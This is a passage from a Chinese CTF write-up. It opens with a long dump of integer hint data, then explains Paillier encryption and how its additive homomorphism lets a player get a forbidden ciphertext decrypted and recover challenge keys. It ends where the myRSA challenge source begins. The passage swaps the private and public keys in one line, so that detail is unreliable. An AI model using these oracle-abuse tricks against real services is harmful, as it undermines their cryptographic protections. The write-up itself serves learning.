<span class="number">331130373037972001102953031643382396979515964662489304624052488599160912795125160318234519866642862721633549672188701928861692419781039403840641254068539850798575561274690861739963655892301251695988981187925766294767450652522044825947072128307714211239079822531930197101207969937023517419925930409353825469456226</span> <span class="number">196704911547760567284050385731420674598076009873937693377568299640915328091276826164288794904728879719838179674854608315870562759589598280794236610105908731802053119302919824057716122846479842474006011859073682756262425348588662373737717717809493704161975650796417793773383864926652328614176077844057491179246910</span> <span class="number">288744198187345908570426813950261730896271408792096129336472163819416730502152105449025428248211255417197730015467772830248900326002936441227960684688864722516521525191672054152484703319784200271826100588335140247721191783466829259326414039557724063431691211227913699402111511918673142833813709806399089806975546</span> <span class="number">314160223766452128579861005172671000313971828439735851393262164809908257282848874122242764968523201114287538447091690854508720803096513486245768971488677977869350339315428637361871338292982643086514218979033892662963486391741214111508994566591061182896746561270891596005443031433846504367118107622229239977276052</span> <span class="number">189314236510821958625445430297109310134459612061711583414604331893732423721978047783341627397557474990718081085631468140162397553785849716100088347097532996712406961145718960009877973385090750342652920674969693743369930774328443450698143101676309961271021142165188231029831485825620637611121566388434213441041096</span> <span class="number">227639552218697766618035615326387746026843650066567132578875508883597082357592196162419744534440656044550494746125485842331141490201209016484918296246228621704119958599025229284474910953153640550818632543298036010211688361274429640306899078083556482685291746437500121569910687838704588261871609562916512113037410</span> <span class="number">341621018888240518807088960299048188172191849234245240565461351612311451713088355317382498839718740283303487813712545677438538191672307052718249730232826087575245580972526424458884227978317230336839594003104736635324065238353876804896463305487006586573048513769652818984397716990022803444704505403150568839937138</span> <span class="number">216123077597152132543630670055269355562199345931984977069037529561514448756215530084689405786635470262971143013769794858355361684212611373725736278526814079560912323372074535977186754304069656065912163601215527606484677744091044035587999329874182822695884930958986741304204631893956526941198447873806112347365238</span> <span class="number">350298204021132344257659928097604044921237222358378927732052872008584412852634064984624664344363578873080685686411093410611433994933116392788378589446822611880527091025930422852170519748147209094085814437888383833134133192292228128381066537995036728067660581836663906430414686433434109211476345307877724982369566</span> <span class="number">200569699342686680129903260344190813491599875824275561995415417992992364171175737877630396237878781295169082420288201968428809514772651346528112268662588646610825249833788236333925640063619265380075700566826814005955004973364289204520681989309350580566136586613470414932749986618410222681347403338516521993389274</span> <span class="number">332478634383163276191514436654984678626644628860495401127847164436988350622884185489705399320379025473215204548604537140222014597979209029412807609351867634340647611957419248676258721833190432147074075941996333693958169415292190320714238628052320125734309181334383282887490511035825947758674019710633863920336336</span> <span class="number">261481571288761610800515150486239610090331881249174640784108800313694626026841178466448957106989246864194399955219765857389028396266490104690730233453940025110318346160598377268827783341728983604303433320271296118655344082911605622359592868855357966088669746859470179508992926751243414162275611424954419765271272</span> <span class="number">271526861887128138669968046830048945304754693071589434955478245894201567706163208390117728390086337577629494954350030139407920028158811011700108620515049210346381025264312249863553010933610047283708909822728743415380489856722999944947873038916850860460362112591717191847137387215708856093149926440860889221400378</span>]</span><br><span class="line">[<span class="number">175623149805053197861616427683048878592469524974820452081294531183708188952375657046874812938982110631942350028046267697790338027114302841970500843978963469894314503492642840507622494347676184175962190032164434594555975061352399167713874115936399166570170307250393157272582473779794429786721454357428554055159828</span> <span class="number">246472611436373388239989661262173930524461618600029181504765699614474301970276617977851330684035970342072431179147767677367241532556896669908885117835754331334843727517471410398500159811450355927016592764707924286251133211055134972060347454783378181405300582327936758880369170633433008223405702509773222249658771</span> <span class="number">170377117647133131861289078713069922178957692045903085485564629374697887248831319867373965890439419910888947304840558380439836673832114066395431739843608354832983406132258122150538490567648312137683478888589773810236335287424835277153061506075401034916105107183827331687942412766694195145073944164864786465418793</span> <span class="number">318880184470507855794337241625696100876255739459264701724373627359616961808074072150679547673649825042488879425799140386442963254577946153120439178044973494562563957793474838949737206015100240847360824935865463095332048802516593999858232740720853073685342567934894566050276362805521406320588908095085794437655518</span> <span class="number">170877188206950702651638691126547231307661997097691500999883172125449255821553387294756734615448405424267054425178987576456044259468078157017008218367575690622832151059934884069768859955396839274914542608568258587793577885498892836078118559208149330317305585424678607528177529820782274439777715575337461380706616</span> <span class="number">206063782701414601378657104339844733567076877340250596380188623480511149894410345740302523035013420807252174879009909465492848072324709491924842595528733544155095032521446041004004338880847069376043875548470405766831552295017253969018349754977643264961787752465568281070481540959661907998749354350611803463427194</span> <span class="number">296902855337610822083670637491151564796725031836730507640114579121100759621016835208167001121556790196308667848787977067269971514621628384560398865788176665093040101150549146216915078889519516752791380364048646955401968897448644344227182351887267732056428733969213082815254850806687946171726768790110167709536447</span> <span class="number">288696280164728236166908851041294126515119598803028148975577739092543353072122368433038776520382101061701416136805797803029422344214691012190791756621766050907284654673202454318182027043589587147268298815665800645728242296352078713078969982360873210164364082622944104383788870742732002742431888753904166580845956</span> <span class="number">165736203294259897057860224941109788933753304107990451347556498450534345580318965824916311089496822921822336271570417438683256020041657954189552944520698938307096708718845505202544383230308227719320585778589882295006065300598538148699629449664102808980309933467806190864687514019591877476401183225646367359357939</span> <span class="number">249874714069496977802858983978269755231822334239693578113242758698060987334899957207653349381137467505217559841886198205698656243173634161018849158180165883314829935431977687561072757393068458812258609501850265110222383324683109878654345581064693931403813786926227157909942436884699913315358386420391348425202730</span> <span class="number">276185091021460126251403464203383531551270101223734429360714029909700118803908402648136835802798332818146339309387084338084778767840523849225812815989953543896488350336682093621179992593388836302388290066064653209415361696422734628833111685768822301310847196850362475040891843431422987423098238410429826347141057</span> <span class="number">178233425293726887379122401536860120178322308260626893660118992348808245101362815377642430952905493472258494231289246843918056624766587890675725838663192213990655769602268958410473789506042922545222536788380485727577290212477546807445792687920398621489120123019615942748507441603362226862253853822543116545385835</span> <span class="number">201318770379458483550884351829608639412343961437945452007135216858525000422747657723793875656466500557967284959547330862427397103520071968294206351756171979819157729166406831986566429836134587979891990023336453264404803183826997290507820050176872113724842252709186034367140199197200554850923230098368528091354727</span> <span class="number">275101003478066982297142226914802638801476022302467989552456610713198223325752945551523797097038370080012893545660861033428714922218051655619133103597797529647489096571635032556150305695917870642826560961039081483737278079868058119617191905211025704037908969151296010716469170979254288869817419337172909965664385</span> <span class="number">191249958163947446317734469465421081643380085390691894717888542781495296693984620850729830426974507061065442122276760345379784096335904357269709051257814975371286222262605797484327357943942136830524081458036826390915006444835238609374930032884999988873539314866370053141151568231199795915419316787054184559941630</span> <span class="number">282956767685374732684255505055321721541404064828514007992198656321848213210108304752569039041858075019113865418514589306981230705124516257723815726304348813185430791760354942068520172912031833198724227892758160303874210781537582304401386959233136874198846566732881678510136605198160541154389924372493390566790348</span> <span class="number">176674189063647946166661855123364607063564837999118994435761167829387950465557500962172651416083632955175717252656085414817120885100783500674404865386260348794097629591012031742941277217851738968060839882480813976573845233225224918480042050569618479847752577956637361266229050642559205888548899935869529919789287</span> <span class="number">293629454439938675665246149997295229780540641224058348104467608274064565127389468481157539830025313682073189415697778733776823698579272939265657643462398039106586916514045559978839231057880657927816845504452419329255147403629087612138586386196491856547187734111017683784372399627157138963836461318222943418486105</span> <span class="number">214682330124308024533638289687908875517563936766412556789208137260848655527240791264786452120718235046960492471701781470115047433128288077827315908726921960700779371308425360277049728613242474818106770056751163305492738270320109661267437252899321241565992339289983249509045957363772431428834812448408764831008567</span> <span class="number">228022702864658988969129022620419283010435522655071062902293956079551522596246345831856235014806281948127943570821740330290263903929956923207512216200564168868549687871485861205457540731003277927306702487900947751779614446042211492488056556189716450536869314181576767095238989836140137514924414849863116384707683</span>]</span><br><span class="line">[<span class="number">263802743125065611854663706068826473561435130056041380581155630159114016161797108738656054337301552361104745501626297744633677998346389065885445645225457392264402685256446732617410915726199518821525714030999876001288222121346036166521447173049410694650991543915554892354947398312698794503377416461200156805394371</span> <span class="number">320896134423422574520240291349147401639165979146192371278439880236522964304051823480657847175591625518422085492381476122103312288655761052752873859442484769169558817241190828341156841234335477900521098762932369961822782795332987578356546553091129465224263619589247264313390916497174987642177073698938428902840770</span> <span class="number">230464972367479080091313350804632442414768036789683466924014697404641380950005377670596402791035596590047124322259265099437564010465193833824987830791614121854733402779045590771445706674507821069394743283382958662653151758735070694245428140605405921624590397151426686885032916820611603150033788347481218566745273</span> <span class="number">421261585084920182446526495116643480392730469743827862006216040691491037160349188404172456435796440269635067480312266243739762324986305046947862269526406642811474224946858743837123817349029135138926502157998094768981502376251415436206392989253122792087156371410523822026858140041260169395691454120077192521149849</span> <span class="number">185418536811440205699072355965719607122795550862289332526528552739801300951966026705708542480834896336207347778790055231810444767897930754793773163859353636496571221348155463841169805294550379893738848892918721076975081924623189390447191060248314140980281056389234837461879760635375755455911003842191792795699836</span> <span class="number">222949724559345369515876742376324208474209224401745813603650618654941067496891076969113387600769334247281133503335610185231877298699232167392913882548246585496460081945346996617879304918670432568357795704162111628133186356553020806543056111488324767104871563625990468493103277705324264277570952424392190201115938</span> <span class="number">417249053603668860398638007724313631665518151980453893200754456866793289926569742846593268065826968812251298412432228047579953515503978207959604779316946038737170598679761205004141075158189151106860397601785647200476690891680045886950663791354463313670237037104139315333948309323177215513136677962596505855724482</span> <span class="number">380703131258698442484257295705282460138459501506258587963804780147303689301498863853181114417387375260509713819428913085369967503012855131562124116143919603142878461974086212048882400470582722117027508918953850900225592332853448851076539375095239472294957289814520378739330818569447425759157258662686334253355500</span> <span class="number">174769482355480588345311613010365968105647777227983215629383135386253956970539798754553852061207843036431767577299073223868970306308504095596195583150625655494261586095058072743229891433474993939942398453442773226310901826479117219151788620376072999054073000931518253447386312127143793652689063987632256694644897</span> <span class="number">327164800502570111999255169062214852289024650041204000955392696812938650601633308356122411433015318582625120285841145363750655096696094085909404926864951469926527492900081602416299690043335910528297439260535586701858449443390263596697025175513931804810020282888341740518192698006322684878974982369786387253681316</span> <span class="number">276439838719650764488760706539413808941389453025425230737995344354680683748291159898514158071497732848802350556863341028359281838520453819661935776752717598508065174375624156487099823622160156401934005153049531524751416677363022090927104928829311418942258423251999433232422284391368310998233207512721564461566556</span> <span class="number">212704186544971246222074331123597727663763455268551960984096797016253016572607107738345004231955896971368977347100937140263521419465021517581645826070200344547730659859242952260350574881399238499262239129867333898104370883831229865121085602266005715278431850604432546565292403574347428963378485409396018837106565</span> <span class="number">231137422991648931025191013127711640031515047110174466235597219684768405973493313199593637448742237427662518543563796364330721637222614008904215424565320301609005142351466971837943478984805812334326839891442190086073513302604672100631364143668945324150473253860772189723193828633877450731413154571181731485383640</span> <span class="number">346852671310986416620268341370428386760027918834948503130669645512096062908498635870610732389477638337172232861669770690949699384690517861680456761451942282251505556444345558964135302046566863123223076364168217803125255031661692235457299179688870858823807648198125758577241371873680194439823200696888713230902212</span> <span class="number">287263520323336668880280185765643127589437972686582801399161589015314791815648075056207418545231544009174107068734307569837848323966298363454768482796027048582738173591634259891835449428405948869830133193571961548167133122964174404800246571823699011968363185640067441086555205137097354790780403579717485627270428</span> <span class="number">329883055861881025727591665236381807383719074549752885591622161226411609685765134394593157735189825832630380022491502237968886970250397907315413692303541068768129070878124619704366859263263954300306812557267687229123228539052606395691784049866558707964342564260464000612180076523125192753373680388269270251292093</span> <span class="number">201692153923743022227927922047012721514180108981353368638070298812204958616153080716604722976256960296951889299093183379416088095323189536529677512957987101520044081457825018058425104385133680831223186160753040038771182132856411426923327440105070960271874601546071354133543964253783054427578572957912051207772513</span> <span class="number">354771700675583689488569097633266345033034292834823785723176682704096136540587857424377104859410919264303365927838937302098461729381745740962742266932049996634084571342813380437030001692639691503587914683483656386548814219223701731884065962930763473181936744247429314463543439726422938526232536731130027472637830</span> <span class="number">230943984818628219775424803943028701981262887753550449093347433635463647762108622471462562507767132209632555402602466878568574695007510860318898140196565498149897379414874244619642393298505525196971748179327488678703246568095898056962050502886150246314565883735935819566751219493409162211248339527899412213120834</span> <span class="number">244910871291180999540876131038224678232782647136061474463687643873084543167227132404515719210986376277025566516062270578690175262957119201647454438547850156698437789055774160524029594829257639261357142899164701080464003135214505418613322361259961533744317674692792378760082345835178991716760837668321047070430650</span>]</span><br><span class="line">[<span class="number">231102540504208683441278500770895450337994063758279044260909792393698116506583800640851716359612166617240329487078459778841086713848195408744926082983916425830805692662231680741038932462856578954369707740785537756521479763236859696269883824392264522940260726858607980820451940360570848863128174773820966893542712</span> <span class="number">265743734539653579066835004687831624350083553970235027604869801864636417556415826517642636904826103365256026528700260782452262279883815530182066276024124685278906142213910928844278925366115374824819693956067870537172894170375835301853399595095899259427582434932770426845870293172991775662360978643716901645727620</span> <span class="number">210349079405696356836538429147292337140360379103893119806144305020385537810464131226110659619069825547042724403301927985448569166987375224344116671622639914313998860456344048567428725234911738633657245695536663944656516106445205837360781053063252827728226509266208429994258965053096885963127408584682983838548084</span> <span class="number">370092127898495881883221131176739243404828188407936324478335445617644816968311072375693897341700102453800936942469264963561739173638500247105996819894999098733448347624476545606461484793983759760189221130816420100595493771321881846212596470412808302539426346257544008296437757331559126525153939418649272581792003</span> <span class="number">155843799780863429380712206517786331534603283457507603179350757031764349002066382081296339893951785831207307434330926859216544592273625218287709253187474640563451801142789872369433700787170933202626495936868489194039759368130295796694222122781856473407481019062743764408613678191642331547280835219937956830086253</span> <span class="number">208685660430718063023134818029600681694016927117366633238131132958445192019428111787150807087651421606387641544353440933789696906455720573039977965313759451536284368188362063603542263229302204204759430462874611474874693438431550965726670551232667004605117637529486443639284542463827061463666813013146069774596623</span> <span class="number">376495416003518639674417499958175701281929854694917681678531789462561603655488327795424699227219006166599077979577816057057415815525993272616746606687608525956800712326556097990469731933725132735734038748976627488163875926676975364618802603834953770499093436489566086645238136752039949240162647636828987179834579</span> <span class="number">346799239413999488110498971912233459911177299861483583332921749052093930592747061842509813134949357072475802378493682633518872240913782965807261631327544141893983294043896670884763376696794350429609524179289465879806052942382457120210869053530047151528132036231308034634997696854219478164213710400852077248821120</span> <span class="number">169705981594055626191526129703854602873762809855971515772741441032501696121273578085381028584987027704846182419400909557263824386366943105526662769950004781705890276127517431544466618726548271127228276365582823372401537605732731021620104320190337969973584939402421466369627565469352767040352557329922040477005195</span> <span class="number">314939568863760290384540118082752153809732004758279668349154520117091144948135424245524366340063324424008929024207003162245020293740471292239566910120785826581236198268357366087675220099414793533202441187685322391483201816424704819088053895597092471373867194127053233302646141670296885753306292240050902882067193</span> <span class="number">274501944416882995735758799555202391039362923348719225643877708282924068365040664503209219610043149528435249078029298305750485892232308481502453379425972726421550496575359608190796610287241500978967423412598029333421297963696957974765793580684264457336896386351474306901474091451058371162815205889658547288756613</span> <span class="number">162042852002525722516821528383186018278575449206566435454250047908141061435368036746325933601126615024491314927660133760096281320705776102244655820780663122601103393383949947351281931199892199251850719799714623843639554360811771032929325708611802494168688704327872997885604422684877382926752998081879550922673159</span> <span class="number">199186847050874310663711759065373319818497267251671468587770424206352468442476247991295451181041636866403183712299615853839562933931317404502686066913393985793556698127304344410066576991382378189507028571235204890091478641432426168888625939898268292807620365706172657484050320408998105779117927886741609753059306</span> <span class="number">354256837940358751229028023821326933124473022943665368069235748497806815006951251158634725639701700571512263598986222866058897650192202830132245087410002342397999093293483377281475490558826621520353888584868610041332064027926228150805277127860712298027363127401797551506511822135023888887056550951578462666401168</span> <span class="number">234330939937018332512234165522950453367160881291461134878469921151439507789729630447378709490321610875562768524667352209340414557186328790809853587586777294529691020063694501014064937325044229606219932489176634851086737384369314067274741216128951324322584695745812899005951037076673803633700002116900191518343104</span> <span class="number">332082029558565597759771105851214333635988265232527004414362567577413617394351558271692150498317158739732745705862594401942142069495962667568131355700265663419672348704206572928190457355848914210638948420335608466079295180163933469063321924973352389720524124550782071251683357371242157306460292201842796159597718</span> <span class="number">176986136483895554690418327829140706363382659137667608820689582879245220579777187328490743894561014022554001750978511533817549261532456394670700292294046329085693852890349308569443762100181849446497355153201880907487440309844376681147420667541370307460264411327087925505905262620386071002765983602129410981524825</span> <span class="number">306033578065708181892360605636488380307220653372422877388073952287817583833546967101487424935952427752988503478955261900401084739761751200955335173846876897288478246027251747140227411624609094450221789960283358822393959292926844401039921802250862735005064118599109755577207049891717698360790293581097903491018814</span> <span class="number">219314874918300986481829428174736339804584038904721479645481695499805419784152647017619171604955608496067000760324205776683331070846048793475354613648011507848178533546104483200182624615627611831889147775959481609079024343665913206339506497470471534463297926880205982018469713052772296925382623211807447844984467</span> <span class="number">251411658980176426424599861269457962905360409027060289781517026051694351718496780577508779445417678245301909030308343439327126522122700289297564268748528240372257642080980189466101294410540270453169210457925553360431225739589139247809993207475957612679571134629233136065652272322414452523211844945796568973495999</span>]</span><br><span class="line">[<span class="number">241061899028073988798790037741230393483942234086601336070745000327245876506533109773029357915901349628815872451441889563829064856413873527725718859869880048269099752637807588068089888054068969364294640041411106036524096059153691012518740485034056356062246082921852430278113420285101114711615424549249139277257522</span> <span class="number">324649731643599086115112993009519699452138031914097657036589002455757996538628271536312086027891113179012194983336641812429479724987783015151964019081755404469480800754838022457743380789954890634612176691117396518047463228921056260150822618165077435901312097677295072882034763535523532942532204433934684610043981</span> <span class="number">235254970787462219840404579655013559873788828426903153698865648656984467361490822488648895501016091744753460386479405178156171138845774327715705113786912265599410014203748341886209366676022693408156368163002599405494601590496989401198973552929276456687898371994794916975190041122391592774191440696356717294231885</span> <span class="number">425740880045791532523198846621983282509953016391567213186903868019913918759794287097305752661999887010700707627995323212438864509866508575502091321511540826163355631924563516051145246887413009375239895267200500759550085778323118221354084194236896509274319680974593889376664049241305285099994139673137299475989239</span> <span class="number">218691513540400821804549224498219066538131669904044585243726742849147890707633382757651080960290835528290337948081051248880519870334888312880595453864524810424852223683875213593288669664284711136053455521502919177926558970455107382642271908290895517253209256467433830518046957366395690737578182144983590102038485</span> <span class="number">268302619218865130271719033545009753399779053711844155079138523469992700794733191273489783510080694015540326749356237471601952640624690574647332040161941087090977941149395995577883320516589414044570632833251347023576508268184788428567463591494267298109046818940098510550915355847388894041086742208584657569920241</span> <span class="number">407336383942338740798174626239389115510448736801033328217610646742146225826124003788716755725647121531842265937484525828476656038527198785623700663154028773955096919034338929692107410713949725783634901653340966038961119651080922944892272587766538064084646021325484724541568127313549775873739584827773006445753640</span> <span class="number">393134681808112694975913596160448244240482981723630973356146031804916532236941181457510899673572218259277651984203628914738756762221755837644731654303750753476197281608744739922590010615338565608869292496306096877052448883659921270645325450515812730222672889593367986446631364900471069472193722736474834255002036</span> <span class="number">215985610462350960536839616461780541805901325846759115271248048215287698136361487020004528283989079601628886641948076104288189678081611169093333207280398109804824624795771554170650549004098320777411071055885304220606333844107189337640129908960147941269202033000097270450548214871844613318043993706884193566592242</span> <span class="number">346257259037055528063958283678684887823288869097971263870223136112022875717777736826173871208586562198755058112840232705464980999720904563887473827824133419842768406438046339340339959582840029978504197963610308123410599725432433522242213697754185538704211639401044451536292208819236994660059970571914124114271599</span> <span class="number">363246746808596148737210992794327846617357056818891810187521430179806831944113701788410216011602199287600811660665546421846554242509136889853836816039021455766143689619674758256794863013934396056281068369903404163406671974420976176790079516456790272028047801640717669827329331072466985218901215709420185800516476</span> <span class="number">228359797357492684759272370677578475406914608085297270343294942217355808434075355292324467198813215227688688362769136317178109975711230089700653102174151262564835348723399701993261280133408455332578461475024635686745323218522248731512202235490816229580164661361372292890652140155335039766689335306017058323699870</span> <span class="number">261073525188914242692884720274275113790550147800012726232648813501113485629042787747610119742164958912877580849092420435073309574603834046313181794097664949615030331077619160759088825143525257977326603290777510448929918569695246869201664075528458430758464117802684751708437328671301437881253087978552349557929227</span> <span class="number">377423095994193204578922189550375597310060100452415257679145216869152987932295320012532627260082665449818987730073474556374560322751066241641707700730565368688246016131410970218689748683166415305887428221617894893227940635682372402200646522705710629106816809097492815206152579668106759027411978172342124297112303</span> <span class="number">259137995605024246569067807228464978520111212301361385815260982586344554863475368048854803571456089002898762700215696227544178787894944543608617271366117854871387117184290022561543196044929075487901413409938350861993081883369167887211440599019001236665896078599620016292614112682026683285287944667378349567596682</span> <span class="number">377895600401386832627207473591231966722427474471978045257286932968025516883841438396371773330379400989122373108094619359580992354022500428350148393367120309907862372401833632609379756774123183371656856319067036230164053711297648196590505716602911948600987377951831975851533902097405199596765482628047101483695180</span> <span class="number">229923888278321507619955308253814201187825646322202404258155581951646311813859740021687863337140515937531198397962741508305877398164540330415865591188990653875351703558714013038074531074780496846384342682480155793583956273003471876034817892417654830968846443801102524499001760690758196360143326941316313005428764</span> <span class="number">385146020849542828762376295678872983417037260032909849077585933133727150028194380453576167080843313823221853494336578094737485648365841025909075506522610021346056261722697685735150058706447775324473174749709672319355587113103471390302308032073417731526776326495675395951587591860727897765554614275689077980788425</span> <span class="number">276479395595285600707058522756048895783507186318454062608303747878078415416637508566237782329945122675299190201507390456469318457913011040396520935462671813934491352484079874838580577796640954416628460793482556447364053471884684684531093453142733820253696024739578833329629972259929828470255438392962899864298928</span> <span class="number">304113742334779824637859934428402926505401880740389378433569048603311596599826036448865299394425292925430829973661203201761633383418875016143497844450341141334585646363757368824123351511948673572982552037453552797655001298458947196811495751443435574229011561264850603574487599877204387001096835704274170180520128</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在一次任务中我遇到了一个challenge，我的队友给我发了一个他截获的hint，你利用这个hint能帮我完成这个challenge吗？</p>
</blockquote>
<hr>
<p>先介绍一下题目中所有到的Paillier同态加密，又是从la佬这边来，之前做到一个GM同态的，<a href="https://blog.csdn.net/m0_49109277/article/details/119841199?spm=1001.2014.3001.5501">InCTF Gold_digger</a></p>
<ul>
<li><p><strong>密钥生成</strong></p>
<ol>
<li>随机选择$p,q$且$gcd(n,\ \varphi)=1$；保证$pq$等长</li>
<li>$\lambda =lcm(p-1,\ q-1)$</li>
<li>随机选择$g(g\in \mathbb{Z}^*_{n^2})$；保证$n|ord(g)$（不懂）</li>
<li>定义$L(x)=\frac{x-1}{n}$</li>
<li>$\mu =L(g^\lambda\ mod\ n^2)^{-1}\ mod\ n$</li>
</ol>
<p>私钥为$(n,\ g)$，公钥为$(\lambda,\ \mu)$</p>
<ul>
<li>通常还有个简化版<br>$g=n+1$<br>$\lambda=\varphi$<br>$\mu=\varphi ^{-1}\mod\ n$</li>
</ul>
</li>
<li><p><strong>加密</strong></p>
<ol>
<li>$ 0\le m&lt; n$</li>
<li>随机选择$r(0&lt;r&lt;n,\ r\in \mathbb{Z}^*_{n^2})$，且$gcd(r,\ n)=1$</li>
<li>$c=g^m\cdot r^n\ mod\ n^2$</li>
</ol>
</li>
<li><p><strong>解密</strong></p>
<ol>
<li>$m=L(c^\lambda\ mod\ n^2)\cdot \mu\ mod\ n$</li>
</ol>
</li>
</ul>
<p>查了点资料，问了下师傅，稍微验证简化版的Paillier，由之前学到的求<a href="https://blog.csdn.net/m0_49109277/article/details/117909339?spm=1001.2014.3001.5501">欧拉函数通式</a>可以知道$\varphi(n^2)=n\varphi(n)=pq(p-1)(q-1)$</p>
<p>由欧拉定理可知$r^{n\varphi(n)}\equiv 1\ (mod\ n^2)$，带进解密函数，注意二项式展开，$L(c^\lambda\ mod\ n^2)=L(g^{m\lambda}\ mod\ n^2)=L((n+1)^{m\lambda}\ mod\ n^2)=L((1+nm\lambda)\ mod\ n^2)$$=m\lambda$</p>
<p>又因为<br>$\mu=L(g^\lambda\ mod\ n^2)^{-1}=L((n+1)^\lambda\ mod\ n^2)^{-1}=L((1+n\lambda)\ mod\ n^2)^{-1}=\lambda^{-1}$</p>
<p>则$m=m\lambda\cdot \lambda^{-1}=m$</p>
<hr>
<p>这就要引入两条性质，<strong>RSA和ElGamal是乘法同态，Paillier是加法同态</strong></p>
<ul>
<li><p>加法同态<br>$$<br>E(x+y)=E(x)\times E(y)\<br>$$<br>取个解密<br>$$<br>x+y=D(E(x)\times E(y))<br>$$</p>
</li>
<li><p>乘法同态<br>$$<br>E(x\times y)=E(x)\times E(y)\<br>$$</p>
</li>
</ul>
<p>非常好证</p>
<p>比赛的时候推到由二三四步求出一个key，回顾一下</p>
<p>只知道c1c2其中一个，直接用同态性是出不来的（可以试试看），必须配合攻击者精心构造的发送数据</p>
<p>根据已知，假设我们知道的是c1，m0m1完全由我们构造，最小是9<br>$$<br>c_1=E(m_0m_1key_1)<br>$$<br>在二四步分别提供我们一个解密的机会，但是第四步不准用来解密第三步得到的其中一个c，那很好，用同态性绕过：不准我们直接给c解密，那么我们将c稍微变化一下</p>
<p>比如在第二步的时候我们send一个2过去，这样就得到了D(2)​，第三步m0m1随便取，然后在第四步，将c<em>2给send过去，由于<br>$$<br>c_1\times 2=E(m_0m_1key_1)\times E(D(2))=E(m_0m_1key_1+ D(2))<br>$$<br>将c</em>2给send过去是作为密文用来解密的，那么得到<br>$$<br>D(E(m_0m_1key_1)\times E(D(2)))=m_0m_1key_1+D(2)<br>$$<br>我们知道D(2)，m0m1也是由我们构造的，所以在一个循环里面解出一个key是没有问题的</p>
<p>比赛中的思路到此戛然而止，因为对于key那方面，是一个矩阵的乘法，我毫无头绪</p>
<p>在复现中，我看到了<strong>关键的东西</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R = <span class="number">2</span> * random.randint(<span class="number">0</span>, <span class="number">39</span>)</span><br></pre></td></tr></table></figure>

<p>这是控制key的，显然R是偶数，所以如果知道全部的key，然后将第四步我们求出来的查表如果是偶数那么说明随机数I是0，如果是奇数，那么I是1</p>
<p>于是这就有了我看到的很多战队WP里写的，利用key不变的机制去重复断开连接断开连接，不断炼丹直到求出所有的key；确实巧妙啊，但很可惜，我没有注意到R是偶数</p>
<p>但按照出题人的意图，这个应该是非预期解了，设计加密方案的一方完全可以将key每次都随机化或者R就取<code>random.randint(0, 79)</code>；所以还是想在赛后看看有没有通过hint和key.sage来求key的</p>
<p>先来看主代码中key_gen的part2部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _key.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">80</span></span><br><span class="line">    <span class="keyword">assert</span> key[<span class="number">0</span>] == <span class="number">119</span> <span class="keyword">and</span> key[<span class="number">1</span>] ==  <span class="number">241</span> <span class="keyword">and</span> key[<span class="number">2</span>] ==  <span class="number">718</span> <span class="keyword">and</span> key[<span class="number">3</span>] == <span class="number">647</span></span><br></pre></td></tr></table></figure>

<p>从代码中我们获取已知条件，key是个长度为80，且元素不重复的列表，前4个元素分别是<code>119 241 718 647</code></p>
<p>key的生成与之类似，顺便得知key元素的范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = random_matrix(ZZ, <span class="number">20</span>, <span class="number">4</span>, x = <span class="number">100</span>, y =<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<p>已知的是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hint = Matrix(key * vector([getRandomNBitInteger(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>))</span><br></pre></td></tr></table></figure>

<p>$$<br>\begin{bmatrix}<br>119 &amp; 241 &amp; 718 &amp; 647\\<br>\vdots &amp; \vdots &amp; \vdots &amp; \vdots\\<br>\cdots &amp; \cdots &amp; \cdots &amp; \cdots<br>\end{bmatrix}_{20\times 4}\times<br>\begin{bmatrix}<br>v1\\<br>v2\\<br>v3\\<br>v4<br>\end{bmatrix}=hint<br>$$</p>
<p>重复做了12次，有12个hint，每次vector里面的数据都是随机的</p>
<p>好难啊，非预期就非预期吧</p>
<p>老师说可能要用十二组hint构造格，然后格归约求解</p>
<p>下次一定</p>
<p>总结一下，这题一开始我并不知道Paillier同态加密，更别提同态的性质了，但是这些都可以通过搜索源码获得，所以并不难；没有注意到R是偶数，有点可惜；总觉得思维不太灵活吧，但也和初期看不懂代码有关</p>
<h2 id="Crypto-myRSA（recuring）"><a href="#Crypto-myRSA（recuring）" class="headerlink" title="Crypto-myRSA（recuring）"></a>Crypto-myRSA（recuring）</h2><p>这题看到很多师傅的wp使用二分法做的，然后我就想复现下，然后我发现我的理解稍微有点偏差，后面会讲到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># myRSA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">alpha = <span class="number">2.0314159265358979</span></span><br><span class="line">WELCOME = <span class="string">&#x27;Welcome to use my better RSA!!!!!!So, what do you want now?&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;1. encry \n2. getflag\n3. exit&#x27;</span></span><br><span class="line">String = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span 